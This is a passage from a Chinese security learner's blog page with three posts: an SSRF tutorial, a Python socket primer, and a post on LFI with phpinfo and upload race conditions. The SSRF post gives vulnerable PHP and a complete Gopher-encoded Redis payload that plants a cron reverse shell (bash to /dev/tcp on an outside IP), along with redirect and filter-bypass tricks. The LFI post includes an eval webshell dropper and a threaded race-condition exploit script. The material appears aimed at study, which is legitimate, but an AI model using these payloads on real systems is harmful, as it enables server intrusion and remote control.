<p>我们可以利用curl进行抓取网页内容</p>
<h3 id="伪造请求"><a href="#伪造请求" class="headerlink" title="伪造请求"></a>伪造请求</h3><p>通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。</p>
<p>类似于这样的形式：</p>
<pre><code>ip:port/ssrf.php?url=xxxx</code></pre><p>我们构造一个url请求，server端接收并访问传入的url，然后会返回给客户端相应数据（如图片等）。正常情况下，服务端希望我们传入的url是一个正常的链接，可能是站内的图片、网链，也可能是站外的其它友链。php后端使用<strong>cURL</strong>初始化一个新的cURL会话并获取一个网页。</p>
<p>但是，如果我们通过curl允许的协议来传递给url这个参数一些邪恶的信息呢？后果可想而知</p>
<h2 id="SSRF分析"><a href="#SSRF分析" class="headerlink" title="SSRF分析"></a>SSRF分析</h2><h3 id="漏洞搭建"><a href="#漏洞搭建" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h3><p>ssrf漏洞代码，未作过滤</p>
<pre><code>&lt;?php 
// 创建一个新cURL资源
$ch = curl_init(); 

// 设置URL和相应的选项
curl_setopt($ch, CURLOPT_URL, $_GET[&#39;url&#39;]); 
curl_setopt($ch, CURLOPT_HEADER, 0); 

// 抓取URL并把它传递给浏览器
curl_exec($ch); 

// 关闭cURL资源，并且释放系统资源
curl_close($ch); 
?&gt;</code></pre><h3 id="file协议查看文件"><a href="#file协议查看文件" class="headerlink" title="file协议查看文件"></a>file协议查看文件</h3><p><img src="https://s1.ax1x.com/2018/08/10/P6BOht.png" alt></p>
<p>我们url传入的file协议语句，会在服务会执行一个curl语句，返回查询的信息。这个是基于有回显的情况，不过现在很多php后端如果这样写的话：</p>
<pre><code>curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1)</code></pre><p>协议就算失效了，这种方法失败</p>
<h3 id="dict协议探测端口"><a href="#dict协议探测端口" class="headerlink" title="dict协议探测端口"></a>dict协议探测端口</h3><p>探测22端口(ssh服务)</p>
<pre><code>http://ip:port/ssrf.php?url=dict://127.0.0.1:22/info</code></pre><p>服务端会执行：</p>
<pre><code>curl -v &#39;dict://127.0.0.1:22/info&#39;</code></pre><p><img src="https://s1.ax1x.com/2018/08/11/P6Rt78.png" alt></p>
<p>探测3306端口</p>
<pre><code>http://ip:port/ssrf.php?url=dict://127.0.0.1:3306
/info</code></pre><h3 id="Gopher协议攻击redis反弹shell"><a href="#Gopher协议攻击redis反弹shell" class="headerlink" title="Gopher协议攻击redis反弹shell"></a>Gopher协议攻击redis反弹shell</h3><p>Redis 任意文件写入现在已经成为十分常见的一个漏洞，一般内网中会存在 root 权限运行的 Redis 服务，利用 Gopher 协议攻击内网中的 Redis，这无疑可以隔山打牛，直杀内网。<br>首先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议。常见的 exp 是这样的：</p>
<pre><code>redis-cli -h $1 flushall
echo -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/要反弹的公网ip/反弹端口 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1
redis-cli -h $1 config set dir /var/spool/cron/
redis-cli -h $1 config set dbfilename root
redis-cli -h $1 save</code></pre><p>这里网址以127.0.0.1，redis端口6379，公网ip为172.19.23.228且监听端口为2333为例<br>改成适配于 Gopher 协议的 URL：</p>
<pre><code>gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</code></pre><h3 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h3><p>Curl默认不支持302跳转，所以需要在ssrf.php中加上一行<code>curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1)</code>来支持跳转</p>
<p>代码如下：</p>
<pre><code>function curl($url){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);
// 限制为HTTPS、HTTP协议
curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_exec($ch);
curl_close($ch);
}

$url = $_GET[&#39;url&#39;];
curl($url);
?&gt;</code></pre><p>php限制为http、https协议之后，我们就无法使用刚才的file dict gopher的协议了，但是我们如果开启302跳转的话可以，跳转到我们自己的vps上的网页来执行这些协议。因为服务端并没有ban掉这些协议，所以我们就找一个跳板来执行</p>
<p>302辅助跳转脚本：</p>
<pre><code>&lt;?php  
$schema = $_GET[&#39;schema&#39;];
$ip     = $_GET[&#39;ip&#39;];
$port   = $_GET[&#39;port&#39;];
$query  = $_GET[&#39;query&#39;];

echo &quot;\n&quot;;
echo $schema . &quot;://&quot;.$ip.&quot;/&quot;.$query;

if(empty($port)){  
    header(&quot;Location: $schema://$ip/$query&quot;);
} else {
    header(&quot;Location: $schema://$ip:$port/$query&quot;);
}</code></pre><p>通过http/s协议引入我们自己的php脚本，这样就可以执行其他协议语句<br>发送的请求如下：</p>
<pre><code>http://127.0.0.1/ssrf.php?url=http://your vps&#39;s ip/302.php?schema=dict%26ip=127.0.0.1%26port=22%26query=info</code></pre><p>注意是POST请求还是GET请求</p>
<h2 id="SSRF挖掘"><a href="#SSRF挖掘" class="headerlink" title="SSRF挖掘"></a>SSRF挖掘</h2><p>社交分享功能<br>转码服务<br>在线翻译<br>在线代理浏览器<br>图片加载/下载<br>图片/文章收藏功能<br>API或调用外部URL的功能</p>
<h2 id="SSRF绕过"><a href="#SSRF绕过" class="headerlink" title="SSRF绕过"></a>SSRF绕过</h2><h3 id="IP地址转换绕过"><a href="#IP地址转换绕过" class="headerlink" title="IP地址转换绕过"></a>IP地址转换绕过</h3><p>数字地址(十进制)：127.0.0.1-&gt;2130706433<br>十六进制：127.0.0.1-&gt;0x7F000001或0x7F.00.00.01或0x7F.0x00.0x00.0x01<br>八进制： 127.0.0.1-&gt;0177.0.0.1或0177.00.00.01<br>省略写法：127.0.0.1-&gt;127.1</p>
<h3 id="xip-io绕过"><a href="#xip-io绕过" class="headerlink" title="xip.io绕过"></a>xip.io绕过</h3><p>127.0.0.1.xip.io<br><a href="http://www.127.0.0.1.xip.io" target="_blank" rel="noopener">www.127.0.0.1.xip.io</a><br>xxx.127.0.0.1.xip.io<br>fuzz.xxx.127.0.0.1.xip.io</p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="noopener">利用 gopher 协议拓展攻击面</a></p>
<p><a href="https://www.anquanke.com/post/id/145519" target="_blank" rel="noopener">浅析SSRF原理及利用方式</a></p>
<p><a href="http://www.91ri.org/17111.html" target="_blank" rel="noopener">SSRF漏洞分析与利用</a></p>

                
            </div>
            <div class="continue">
            <a href="/2018/08/10/初探ssrf/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/08/08/Socket套接字编程学习/"> 
                    Socket套接字编程学习 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-08-08   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tcp/">tcp</a></li></ul>
            </div>
            <div class="content">
                
                <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近接触到socket模块，练一下python能力，写一个通过socket（套接字）的tcp的连接，执行命令并回显。模拟ncat的正向连接功能</p>
<h2 id="Socket套接字"><a href="#Socket套接字" class="headerlink" title="Socket套接字"></a>Socket套接字</h2><p>TCP用主机的IP地址加上主机上的端口号作为TCP连接的端点，这种端点就叫做套接字（socket）或插口</p>
<p>套接字用（IP地址：端口号）表示。例如：192.168.1.1:8080</p>
<p>它是网络通信过程中端点的抽象表示，包含进行网络通信必需的五种信息：连接使用的协议，本地主机的IP地址，本地进程的协议端口，远地主机的IP地址，远地进程的协议端口。</p>
<h2 id="TCP-IP协议的三种套接字类型："><a href="#TCP-IP协议的三种套接字类型：" class="headerlink" title="TCP/IP协议的三种套接字类型："></a>TCP/IP协议的三种套接字类型：</h2><p>流式套接字（SOCK_STREAM）：<br>流式套接字用于提供面向连接、可靠的数据传输服务。该服务将保证数据能够实现无差错、无重复发送，并按顺序接收。流式套接字之所以能够实现可靠的数据服务，原因在于其使用了传输控制协议，即TCP（The Transmission Control Protocol）协议。</p>
<p>数据报套接字（SOCK_DGRAM）：<br>数据报套接字提供了一种无连接的服务。该服务并不能保证数据传输的可靠性，数据有可能在传输过程中丢失或出现数据重复，且无法保证顺序地接收到数据。数据报套接字使用UDP（User Datagram Protocol）协议进行数据的传输。由于数据报套接字不能保证数据传输的可靠性，对于有可能出现的数据丢失情况，需要在程序中做相应的处理。</p>
<p>原始套接字（SOCK_RAW）：<br>原始套接字(SOCKET_RAW)允许对较低层次的协议直接访问，比如IP、 ICMP协议，它常用于检验新的协议实现，或者访问现有服务中配置的新设备，因为RAW SOCKET可以自如地控制Windows下的多种协议，能够对网络底层的传输机制进行控制，所以可以应用原始套接字来操纵网络层和传输层应用。比如，我们可以通过RAW SOCKET来接收发向本机的ICMP、IGMP协议包，或者接收TCP/IP栈不能够处理的IP包，也可以用来发送一些自定包头或自定协议的IP包。网络监听技术很大程度上依赖于SOCKET_RAW<br>原始套接字与标准套接字（标准套接字指的是前面介绍的流式套接字和数据报套接字）的区别在于：原始套接字可以读写内核没有处理的IP数据包，而流式套接字只能读取TCP协议的数据，数据报套接字只能读取UDP协议的数据。因此，如果要访问其他协议发送数据必须使用原始套接字。</p>
<h2 id="编程思路"><a href="#编程思路" class="headerlink" title="编程思路"></a>编程思路</h2><h3 id="tcp服务端"><a href="#tcp服务端" class="headerlink" title="tcp服务端"></a>tcp服务端</h3><p>1、创建一个套接字，选择tcp流通信，并且绑定套接字到本地ip和端口</p>
<pre><code>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind()</code></pre><p>2、开始监听</p>
<pre><code>s.listen(5) # 一般5的最大连接就够了</code></pre><p>3、循环接收客户端连接要求</p>
<pre><code>while True:
    conn,addr=s.accept() # 接收tcp连接，并返回一个新的套接字conn，和ip地址addr</code></pre><p><strong>这个套接字的作用：</strong><br>作为介质，用来接收客户端的信息、返回给客户端信息。服务端在接收这个conn套接字后跟客户端共用此套接字。</p>
<p>4、执行接收的命令，结果的数据返回给客户端。</p>
<p>5、传输完毕关闭套接字</p>
<h3 id="tcp客户端"><a href="#tcp客户端" class="headerlink" title="tcp客户端"></a>tcp客户端</h3><p>1、创建一个套接字并连接远端</p>
<pre><code>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect()</code></pre><p>2、 连接后发送数据和接收数据</p>
<p>3、 传输完毕关闭套接字</p>
<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p><img src="https://s1.ax1x.com/2018/08/08/PyPTxA.jpg" alt></p>
<h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p><img src="https://s1.ax1x.com/2018/08/08/PyPbrt.md.jpg" alt></p>
<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="https://s1.ax1x.com/2018/08/08/PyPo2d.png" alt></p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>(Python Socket 编程详细介绍)[<a href="https://gist.github.com/kevinkindom/108ffd675cb9253f8f71]" target="_blank" rel="noopener">https://gist.github.com/kevinkindom/108ffd675cb9253f8f71]</a></p>
<p>(python socket编程详细介绍Ⅱ)[<a href="http://blog.51cto.com/yangrong/1339593]" target="_blank" rel="noopener">http://blog.51cto.com/yangrong/1339593]</a></p>

                
            </div>
            <div class="continue">
            <a href="/2018/08/08/Socket套接字编程学习/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/08/07/LFI with phpinfo测试/"> 
                    LFI with phpinfo测试 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-08-07   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件包含/">文件包含</a></li></ul>
            </div>
            <div class="content">
                
                <h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>本地文件包含，英文Local File Include，简称LFI。文件包含是一种简化代码、提高代码重用率的方法。但是，由于没有正确处理用户输入，导致本地文件包含漏洞。黑客可以通过漏洞包含非PHP执行文件，如构造包含PHP代码的图片木马、临时文件、session文件、日志等来达到执行PHP代码的目的。</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>一个简单的文件上传，无任何过滤的页面：</p>
<p>Lfi.php:</p>
<pre><code>&lt;?php include $_GET[&#39;file&#39;];</code></pre><p>&amp;一个phpinfo页面<br>docker复现的环境，这里吐槽一下ubantu..</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="php引擎对表单的处理"><a href="#php引擎对表单的处理" class="headerlink" title="php引擎对表单的处理"></a>php引擎对表单的处理</h3><p>以上传文件的方式请求任意PHP文件，服务器都会创建临时文件来保存文件内容<br>PHP引擎对enctype=”multipart/form-data”这种请求的处理过程如下：<br>1、请求到达；</p>
<p>2、创建临时文件，并写入上传文件的内容；</p>
<p>3、调用相应PHP脚本进行处理，如校验名称、大小等；</p>
<p>4、删除临时文件。</p>
<p>PHP引擎会首先将文件内容保存到临时文件，然后进行相应的操作。对phpinfo.php发起请求，会在/tmp下生成一个临时文件。其中临时文件内容正是我们POST请求中文件内容，临时文件的名称是php+随机数字.tmp,正中本地文件包含痛点。<br><img src="https://images2015.cnblogs.com/blog/804631/201511/804631-20151116135057405-833349425.jpg" alt></p>
<h3 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h3><p>php默认的输出缓冲区大小为4096，也就是四字节，可以理解为php每次返回4096个字节给socket连接</p>
<h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><p>画了一个流程图，利用<strong>发送给phpinfo数据包</strong>和<strong>发送给包含点的数据包</strong>之间的时间差，来写入一个永久的文件，具体在流程图体现<br><img src="https://s1.ax1x.com/2018/08/06/PrdNHx.png" alt></p>
<h2 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h2><p>执行exp</p>
<p>懒得贴图了，看链接吧<br><a href="https://github.com/vulhub/vulhub/tree/master/php/inclusion" target="_blank" rel="noopener">PHP文件包含漏洞（利用phpinfo）</a></p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>在实际情况中，如果要修改poc参数，参考链接<br><a href="http://www.freebuf.com/articles/web/79830.html" target="_blank" rel="noopener">LFI with PHPInfo本地测试过程</a></p>
<h2 id="文件上传竞争"><a href="#文件上传竞争" class="headerlink" title="文件上传竞争"></a>文件上传竞争</h2><p>刚才的竞争是数据从socket client到service过程和POST数据到文件包含过程的竞争，借助了文件包含这个点来生成一个webshell，或者执行系统命令的参数。</p>
<p>文件竞争是多线程与服务期间的竞争。首先将文件上传到服务器，然后检测文件后缀名（或者是有害文件），如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个php文件，内容为：</p>
<pre><code>&lt;?php fputs(fopen(&quot;./info.php&quot;, &quot;w&quot;), &#39;&lt;?php @eval($_POST[&quot;drops&quot;]) ?&gt;&#39;); ?&gt;</code></pre><p>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code>import os
import requests
import threading

class RaceCondition(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.url = &quot;http://127.0.0.1:8080/upload/shell0.php&quot;
        self.uploadUrl = &quot;http://127.0.0.1:8080/upload/copy.php&quot;

    def _get(self):
        print(&#39;try to call uploaded file...&#39;)
        r = requests.get(self.url)
        if r.status_code == 200:
            print(&quot;[*]create file info.php success&quot;)
            os._exit(0)

    def _upload(self):
        print(&quot;upload file.....&quot;)
        file = {&quot;file&quot;:open(&quot;shell0.php&quot;,&quot;r&quot;)}
        requests.post(self.uploadUrl, files=file)

    def run(self):
        while True:
            for i in range(5):
                self._get()
            for i in range(10):
                self._upload()
                self._get()

if __name__ == &quot;__main__&quot;:
    threads = 20

    for i in range(threads):
        t = RaceCondition()
        t.start()

    for i in range(threads):
        t.join()</code></pre><h3 id="前端代码"><a href="#前端代码" class="headerlink" title="前端代码"></a>前端代码</h3><pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;title&gt;Title&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
    &lt;input type=&quot;file&quot; name=&quot;myfile&quot;/&gt;
    &lt;input type=&quot;submit&quot; value=&quot;上传&quot;/&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><h3 id="后端代码"><a href="#后端代码" class="headerlink" title="后端代码"></a>后端代码</h3><pre><code>&lt;?php
$allowtype = array(&quot;gif&quot;,&quot;png&quot;,&quot;jpg&quot;);
$size = 10000000;
$path = &quot;./&quot;;

$filename = $_FILES[&#39;myfile&#39;][&#39;name&#39;];

if (is_uploaded_file($_FILES[&#39;myfile&#39;][&#39;tmp_name&#39;])){
    if (!move_uploaded_file($_FILES[&#39;myfile&#39;][&#39;tmp_name&#39;],$path.$filename)){
        die(&quot;error:can not move!&quot;);
    }
} else {
    die(&quot;error:not an upload file！&quot;);
}

$newfile = $path.$filename;
echo &quot;file upload success.file path is: &quot;.$newfile.&quot;\n&lt;br /&gt;&quot;;

if ($_FILES[&#39;myfile&#39;][&#39;error&#39;] &gt; 0){
    unlink($newfile);
    die(&quot;Upload file error: &quot;);
}

$ext = array_pop(explode(&quot;.&quot;,$_FILES[&#39;myfile&#39;][&#39;name&#39;]));
if (!in_array($ext,$allowtype)){
    unlink($newfile);
    die(&quot;error:upload the file type is not allowed，delete the file！&quot;);
}
?&gt;</code></pre><h2 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h2><p>很遗憾，文件上传竞争我没跑出来。最新学一下socket写个py吧，脚本转化能力太菜了</p>

                
            </div>
            <div class="continue">
            <a href="/2018/08/07/LFI with phpinfo测试/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
</section>

  <nav class="page-nav">
    <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
  </nav>

    </main>
    <a class="not-found">not found!</a>
    <div class="search-items">
    </div>
    <a href="#header" id="top" style="display:none">
        <i class="fa fa-sort-asc fa-2x"></i>
    </a>
    <footer class="footer">
    <div class="footer-copyright">©️2017
    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
    </div>
</footer>

    <script src="/js/jquery.js"></script>
    <script src="/js/toki.js"></script>  
  <script>hljs.initHighlightingOnLoad();</script>
</body>
</html>